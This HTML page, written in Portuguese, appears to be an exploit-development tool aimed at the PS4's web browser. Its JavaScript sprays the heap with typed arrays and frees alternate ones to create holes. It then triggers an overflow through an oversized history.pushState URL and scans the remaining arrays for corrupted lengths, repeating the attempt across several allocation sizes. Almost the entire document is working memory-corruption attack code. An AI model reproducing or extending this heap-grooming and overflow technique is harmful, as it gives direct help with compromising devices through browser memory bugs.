<!DOCTYPE html>
<html>
<head>
    <title>PS4 Auto-Scanner Feng Shui</title>
    <style>
        body { background-color: #050505; color: #ddd; font-family: monospace; padding: 20px; text-align: center; }
        .log-box { 
            border: 1px solid #333; background: #111; 
            width: 90%; height: 400px; margin: 0 auto; 
            padding: 10px; overflow-y: scroll; text-align: left; color: #0f0;
        }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 100%; border: 2px solid #0f0; background: #000; color: #fff; font-weight: bold;
        }
        .highlight { color: #fff; background-color: #005500; padding: 2px; }
        .fail { color: #555; }
    </style>
</head>
<body>

    <h1>Feng Shui Auto-Scanner</h1>
    <p>Testando múltiplos tamanhos sequencialmente...</p>

    <button onclick="startScan()">INICIAR VARREDURA AUTOMÁTICA</button>
    
    <div id="log" class="log-box">Pronto. Clique para iniciar.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso

        // Lista de tamanhos para testar (em bytes)
        const TARGETS = [
            { label: "512 KB", size: 0x80000 },
            { label: "1 MB", size: 0x100000 },
            { label: "2 MB", size: 0x200000 },
            { label: "4 MB", size: 0x400000 } // Baleia Branca
        ];

        var memoryStore = []; // Armazena vítimas temporariamente

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += "<div>" + msg + "</div>";
            el.scrollTop = el.scrollHeight;
        }

        async function startScan() {
            for (let i = 0; i < TARGETS.length; i++) {
                let target = TARGETS[i];
                
                log("----------------------------------------");
                log("TESTANDO: <span style='color:yellow'>" + target.label + "</span> (0x" + target.size.toString(16) + ")");
                
                let result = await runAttempt(target.size);
                
                if (result) {
                    log("<h2 class='highlight'>!!! SUCESSO NO TAMANHO " + target.label + " !!!</h2>");
                    alert("ENCONTRADO: " + target.label);
                    return; // Para tudo se achar
                } else {
                    log("<span class='fail'>Falha em " + target.label + ". Limpando memória...</span>");
                    // Tenta limpar a memória para o próximo teste
                    memoryStore = []; 
                    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){} // Força GC
                    await new Promise(r => setTimeout(r, 1000)); // Espera o sistema respirar
                }
            }
            log("----------------------------------------");
            log("Varredura completa. Nenhum sucesso.");
            log("Tente reiniciar o console e rodar de novo (fragmentação pode ter atrapalhado).");
        }

        function runAttempt(arraySizeBytes) {
            return new Promise((resolve) => {
                try {
                    // 1. Setup Arrays
                    const elementCount = arraySizeBytes / 4;
                    const SPRAY_NUM = 60; // Reduzi para caber vários testes na RAM
                    
                    let victims = [];
                    let holes = [];

                    // Spray
                    for (let k = 0; k < SPRAY_NUM; k++) {
                        let arr = new Uint32Array(elementCount);
                        arr.fill(0x41414141);
                        if (k % 2 === 0) holes.push(arr);
                        else victims.push(arr);
                    }

                    // Create Holes
                    holes = null; // Libera os buracos

                    // Dispara Overflow
                    setTimeout(() => {
                        let buffer = "A".repeat(BASE_OFFSET);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        // PushState (Isso consome RAM permanentemente na sessão)
                        history.pushState({}, "scan", "/" + buffer);

                        // Check
                        let success = false;
                        const CORRUPTED = 0x01010101;

                        for (let v of victims) {
                            if (v.length !== elementCount) {
                                log("Vítima atingida! Tamanho: " + v.length);
                                if (v.length === CORRUPTED) log("Corrupção Perfeita!");
                                success = true;
                                break;
                            }
                        }
                        
                        // Salva victims em global para não perder a referência se der certo
                        // ou libera se der errado
                        if (success) memoryStore = victims;
                        else victims = null;

                        resolve(success);

                    }, 500);

                } catch (e) {
                    log("Erro (OOM): " + e.message);
                    resolve(false);
                }
            });
        }
    </script>
</body>
</html>
